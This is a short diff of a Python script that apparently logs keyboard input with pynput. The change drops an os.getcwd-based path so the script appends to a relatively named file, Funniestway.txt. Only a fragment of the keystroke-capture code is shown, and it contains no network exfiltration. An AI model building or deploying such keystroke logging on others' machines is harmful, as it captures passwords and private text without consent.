@@ -2,9 +2,7 @@ from pynput import keyboard
 import datetime
 import traceback
 import sys
-import os
 
-DIRECTORY = os.getcwd()
 win2 = []
 closeFLAG = {'e': False,
             'x': False,
@@ -39,7 +37,7 @@ def Add(key):
     global start
     global win2
     try:
-        with open(f'{DIRECTORY}\Funniestway.txt', 'a+') as o:
+        with open('Funniestway.txt', 'a+') as o:
             readed = o.read()
             if start:
                 if readed != '':
